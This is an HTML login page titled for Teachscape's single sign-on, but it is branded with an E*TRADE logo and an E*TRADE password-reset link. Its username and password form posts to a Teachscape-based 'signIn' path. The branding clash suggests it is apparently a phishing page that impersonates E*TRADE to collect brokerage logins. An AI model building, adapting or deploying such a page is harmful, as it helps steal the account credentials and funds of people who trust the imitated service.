
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <base href="https://sso.teachscape.com/web/">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <title>Teachscape | Secure Login</title>
    <link rel="stylesheet" type="text/css" href="../css/reset.css"/>
    <link rel="stylesheet" type="text/css" href="../css/960.css"/>
    <link rel="stylesheet" type="text/css" href="../css/ui-lightness/jquery-ui-1.8.24.custom.css"/>
    <link rel="stylesheet" type="text/css" href="../css/styles.css"/>

    <script type="text/javascript" src="../js/jquery-1.5.1.min.js"></script>
    <script type="text/javascript" src="../js/jquery-ui-1.8.24.custom.min.js"></script>
    <script type="text/javascript" src="../js/jquery.jgrowl-1.2.5.min.js"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            $("#loginbutton").button();
            $("#username").focus();
        });
    </script>
    <!-- Custom styles for this template -->
	<style>
	/* Move down content because we have a fixed navbar that is 50px tall */
	body {
	  background-color: black;
	  padding-top: 50px;
	  padding-bottom: 20px;
	}
	</style>
</head>

<body>
<div class="wrapper">
    <div class="container_16" id="ts-header">

        <div class="grid_14 push_2">
			<img src="https://cdn.etrade.net/1/14102016280.0/aempros/content/dam/etrade/en_US/desktop/Public/Global-elements/Logos/etrade_logo.jpg" />
		</div>
    </div>

    <div class="container_16" id="login-form">

        <div class="grid_12 push_4">

            <g:form id="loginform" absolute="true" action="signIn" method="POST">
                <fieldset>

                    <div class="control-group">
                        <label for="username">Username</label>
						<input autofocus="autofocus" type="text" id="username" name="username" class="login-input"/>
                        <!--<span class="input-error">&nbsp;</span>-->
                    </div>
                    <div class="control-group">
                        <label style="text-color:purple;" for="password">Password</label>
                        <input type="password" id="password" name="password" class="login-input"/>
                        <span class="input-error">&nbsp;</span>
                    </div>

                    <div id="loginOptions">
                        <input type="checkbox" id="rememberme"  name="rememberme"/>
                        <label class="rememberme" for="rememberme">Remember me</label>
                        <div class="forgotPassword right"><a href="https://us.etrade.com/e/t/user/resetpasswd?ploc=p-TopNav">Forgot password?</a></div>
                    </div>

                    <div class="button-wrapper">
                        &nbsp;<img src="../images/ajax-busy-indicator.gif" id="busy-indicator" alt="loading..." style="display:none"/>
                        <button type="submit" class="submitBtn btn_tertiary right"><span>Login</span></button>
                    </div>
                </fieldset>
                <g:hiddenField name="targetUri" value="${targetUri}" />
            </g:form>

            <ul style="margin-bottom: 50px;">
                <li>
                    <a href="reqactivate" id="activate">Activate account</a>
                </li>
            </ul>
        </div>
    </div>
    <div class="push"></div>
</div> <!--Close Wrapper-->

<div id="ts-footer">
    <ul class="container_16">
        <li id="copy">&copy; 2015</li>
        <li id="contact"><a href="https://www.teachscape.com/other/technical-support.html">Contact Support</a></li>
    </ul>
</div>
</body>
</html>
